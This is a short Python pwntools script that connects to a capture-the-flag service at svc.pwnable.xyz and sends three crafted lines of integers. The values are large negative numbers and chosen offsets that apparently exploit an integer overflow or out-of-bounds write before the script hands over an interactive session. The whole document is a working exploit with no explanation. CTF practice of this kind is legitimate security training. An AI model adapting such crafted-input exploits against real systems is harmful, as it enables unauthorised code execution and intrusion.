#!/usr/bin/python 
from pwn import *

p = remote("svc.pwnable.xyz", 30003)

p.sendline("-5404319552844595200 0 -6")
p.sendlineafter("Result: ", "184549376 0 -5")
p.sendlineafter("Result: ", "1 2 516")

p.interactive()
